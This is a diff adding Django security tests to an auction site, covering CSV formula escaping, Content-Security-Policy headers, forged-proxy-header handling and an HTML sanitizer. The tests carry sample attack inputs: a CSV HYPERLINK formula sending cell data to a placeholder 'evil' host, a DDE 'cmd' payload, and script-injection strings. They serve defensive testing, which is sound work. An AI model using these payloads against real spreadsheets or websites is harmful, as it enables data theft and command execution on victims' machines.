@@ -3,14 +3,17 @@ them, and auction admins can reach only their own auctions'. Also that a hostile
 public page is ignored rather than stored in a response header.
 """
 
+from decimal import Decimal
+
 from django.contrib.auth import get_user_model
 from django.http import HttpResponse
-from django.test import TestCase
+from django.test import RequestFactory, TestCase, override_settings
 from django.urls import reverse
 from django.utils import timezone
 
-from auctions.models import Auction, AuctionTOS, PickupLocation
-from auctions.services import attachment_filename
+from auctions.client_ip import client_ip
+from auctions.models import Auction, AuctionTOS, Club, PickupLocation
+from auctions.services import attachment_filename, csv_cell
 from auctions.tests import StandardTestCase
 
 User = get_user_model()
@@ -400,3 +403,194 @@ class ExportFilenameTestCase(StandardTestCase):
 
     def test_lot_list_survives_a_hostile_query(self):
         self.assert_survives("lot_list")
+
+
+class CsvCellTestCase(TestCase):
+    """Every CSV export runs through ``csv_cell``, so what it quotes and what it leaves alone matters."""
+
+    def test_a_formula_is_quoted(self):
+        self.assertEqual(csv_cell('=HYPERLINK("https://evil/"&A1,"Open")'), '\'=HYPERLINK("https://evil/"&A1,"Open")')
+        self.assertEqual(csv_cell("@SUM(A1:A9)"), "'@SUM(A1:A9)")
+        self.assertEqual(csv_cell("\t=1+1"), "'\t=1+1")
+        # The dash that starts text, not a number: still a formula as far as Excel is concerned.
+        self.assertEqual(csv_cell("-1+1+cmd|' /c calc'!A0"), "'-1+1+cmd|' /c calc'!A0")
+
+    def test_a_negative_number_is_left_alone(self):
+        """A treasurer opens these to add them up; a quoted number is text and adds up to nothing."""
+        for value in (Decimal("-10.50"), -5, "-0.01", "+3", "-1e3"):
+            self.assertEqual(csv_cell(value), str(value))
+
+    def test_only_a_whole_number_counts_as_one(self):
+        for text in ("-", "+.", "-1.2.3", "-1e", "-1e+", "-e5", "--1", "-1_000", "-inf", "-١"):
+            self.assertEqual(csv_cell(text), "'" + text, text)
+        for text in ("-1.", "-.5", "+1E-3"):
+            self.assertEqual(csv_cell(text), text)
+
+    def test_a_long_run_of_digits_is_quick(self):
+        self.assertEqual(csv_cell("-" + "0" * 100_000 + "x"), "'-" + "0" * 100_000 + "x")
+
+    def test_nothing_else_changes(self):
+        self.assertEqual(csv_cell("Neon tetra"), "Neon tetra")
+        self.assertEqual(csv_cell(None), "")
+
+
+class ContentSecurityPolicyTestCase(TestCase):
+    """The club-website embeds exist to be iframed elsewhere, and CSP beats X-Frame-Options."""
+
+    def test_an_ordinary_page_is_not_framable(self):
+        response = self.client.get(reverse("home"), follow=True)
+        self.assertIn("frame-ancestors 'self'", response["Content-Security-Policy"])
+
+    def test_an_embed_keeps_the_rest_of_the_policy_without_frame_ancestors(self):
+        club = Club.objects.create(name="CSP Test Club")
+        response = self.client.get(reverse("club_events_embed", kwargs={"slug": club.slug}))
+        self.assertEqual(response.status_code, 200)
+        # The decorator is what marks it, and the middleware has to honour it.
+        self.assertTrue(response.xframe_options_exempt)
+        policy = response["Content-Security-Policy"]
+        self.assertNotIn("frame-ancestors", policy)
+        self.assertIn("object-src 'none'", policy)
+
+    def test_no_form_action(self):
+        """A form that POSTs and is redirected off-site -- PayPal and Square checkout, the OAuth
+        consent screen -- is blocked mid-redirect by Chrome under any form-action this site could set.
+        """
+        response = self.client.get(reverse("home"), follow=True)
+        self.assertNotIn("form-action", response["Content-Security-Policy"])
+
+
+class ClientIpTestCase(TestCase):
+    """Everything counted per address has to agree on which header says who the caller is."""
+
+    HEADERS = {
+        "REMOTE_ADDR": "172.18.0.5",  # the nginx container, identical for every visitor
+        "HTTP_X_FORWARDED_FOR": "1.2.3.4, 172.18.0.1",  # the left-most entry is the caller's to write
+        "HTTP_CF_CONNECTING_IP": "5.5.5.5",  # nothing strips this when we are not behind Cloudflare
+        "HTTP_X_REAL_IP": "203.0.113.9",  # nginx, from $remote_addr
+    }
+
+    def test_the_helper_reads_x_real_ip(self):
+        """And nothing else: both of the others are headers the caller writes.
+
+        nginx overwrites X-Real-IP from $remote_addr but passes CF-Connecting-IP straight through,
+        so off Cloudflare it is worth no more than X-Forwarded-For.
+        """
+        request = RequestFactory().get("/", **self.HEADERS)
+        self.assertEqual(client_ip(request), "203.0.113.9")
+
+    @override_settings(BEHIND_CLOUDFLARE=True)
+    def test_cloudflare_wins_when_the_request_really_came_from_cloudflare(self):
+        """X-Real-IP is an edge machine, so the header CF wrote is the one that names the visitor."""
+        headers = {
+            **self.HEADERS,
+            "HTTP_X_REAL_IP": "172.64.0.1",  # 172.64.0.0/13, one of Cloudflare's published ranges
+            "HTTP_CF_CONNECTING_IP": "198.51.100.7",
+        }
+        request = RequestFactory().get("/", **headers)
+        self.assertEqual(client_ip(request), "198.51.100.7")
+
+    @override_settings(BEHIND_CLOUDFLARE=True)
+    def test_a_forged_cloudflare_header_straight_to_the_origin_counts_for_nothing(self):
+        """Anyone who finds the origin address can send CF-Connecting-IP; nginx passes it through.
+
+        Believing it would hand that caller ban evasion, shill-bid detection, geolocation and every
+        rate limit. The connection didn't come from a Cloudflare machine, so it isn't believed.
+        """
+        headers = {**self.HEADERS, "HTTP_CF_CONNECTING_IP": "198.51.100.7"}
+        request = RequestFactory().get("/", **headers)
+        self.assertEqual(client_ip(request), "203.0.113.9")
+
+    def test_allauth_agrees(self):
+        """allauth's rate limits use their own helper, which on its own answers REMOTE_ADDR.
+
+        Behind nginx that is the proxy, so ``login_failed: 10/m/ip`` and the rest were one bucket
+        for the whole site. auctions.account_adapter is what puts them on the same address.
+        """
+        from allauth.account.adapter import get_adapter
+
+        request = RequestFactory().get("/", **self.HEADERS)
+        self.assertEqual(get_adapter().get_client_ip(request), client_ip(request))
+
+    def test_allauth_still_answers_with_no_proxy_header(self):
+        """A request that never went through nginx: the adapter raises PermissionDenied on None, so
+        replacing allauth's fallback rather than preceding it would 403 every account page.
+        """
+        from allauth.account.adapter import get_adapter
+
+        request = RequestFactory().get("/", REMOTE_ADDR="198.51.100.4")
+        self.assertEqual(get_adapter().get_client_ip(request), "198.51.100.4")
+
+
+class TableCellMarkupTests(StandardTestCase):
+    """A table cell that builds markup has to say it is markup, or the table prints it as text.
+
+    ``SafeString + str`` is a plain ``str``: one unmarked piece anywhere in a cell throws the whole
+    cell's safety away, and ``django_tables2`` then escapes it, so the page shows its own HTML.
+    That is how the auctions list came to show ``&lt;a href=...`` to everyone -- the markup was all
+    built with ``format_html``, and one property returning ``""`` at the end undid it.
+    """
+
+    def test_the_auctions_list_prints_links_not_their_source(self):
+        self.client.force_login(self.user)
+        response = self.client.get(reverse("auctions"))
+        self.assertNotContains(response, "&lt;a href")
+        self.assertContains(response, self.online_auction.get_absolute_url())
+
+    def test_every_auction_row_is_marked_safe(self):
+        """Directly, because the page only shows auctions a visitor can see."""
+        from django.utils.safestring import SafeData
+
+        from auctions.tables import AuctionHTMxTable
+
+        auction = self.online_auction
+        auction.is_last_used = False
+        auction.joined = False
+        auction.distance = None
+        # No promo text is the ordinary case, and the one that used to lose the cell's safety.
+        auction.extra_promo_text = ""
+        cell = AuctionHTMxTable([]).render_auction(auction.title, auction)
+        self.assertIsInstance(cell, SafeData)
+
+
+class SummernoteSanitizerTests(TestCase):
+    """The editor's own output has to survive the sanitizer, or saving a page rewrites it.
+
+    The attribute allowlist that closed off ``on*`` handlers also took ``target`` with it, and
+    Summernote ships ``linkTargetBlank`` on -- so every link anybody had inserted lost its new tab
+    the next time an organizer saved the auction. Nothing here had a test, which is why.
+    """
+
+    def sanitize(self, html):
+        from auctions.html_sanitize import sanitize_summernote_html
+
+        return sanitize_summernote_html(html)
+
+    def test_a_link_keeps_the_new_tab_summernote_gave_it(self):
+        result = self.sanitize('<p><a href="https://example.com/" target="_blank">rules</a></p>')
+        self.assertIn('target="_blank"', result)
+        self.assertIn("https://example.com/", result)
+
+    def test_a_link_that_opens_a_tab_cannot_reach_back(self):
+        """Old browsers need rel spelled out; the sanitizer writes it whatever arrived."""
+        result = self.sanitize('<a href="https://example.com/" target="_blank" rel="opener">x</a>')
+        self.assertIn("noopener", result)
+        self.assertNotIn('rel="opener"', result)
+
+    def test_a_target_naming_a_frame_goes(self):
+        self.assertNotIn("target", self.sanitize('<a href="https://example.com/" target="sidebar">x</a>'))
+
+    def test_a_handler_still_goes(self):
+        self.assertNotIn("onclick", self.sanitize('<a href="https://example.com/" onclick="steal()">x</a>'))
+
+    def test_a_script_url_still_goes_even_with_a_target(self):
+        result = self.sanitize('<a href="javascript:alert(1)" target="_blank">x</a>')
+        self.assertNotIn("javascript:", result)
+
+    def test_a_script_tag_still_goes_with_its_contents(self):
+        self.assertNotIn("alert", self.sanitize("<p>hi</p><script>alert(1)</script>"))
+
+    def test_ordinary_formatting_survives(self):
+        html = '<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul><span style="font-size: 14px;">big</span>'
+        result = self.sanitize(html)
+        for fragment in ("<b>", "<i>", "<li>", "font-size"):
+            self.assertIn(fragment, result)
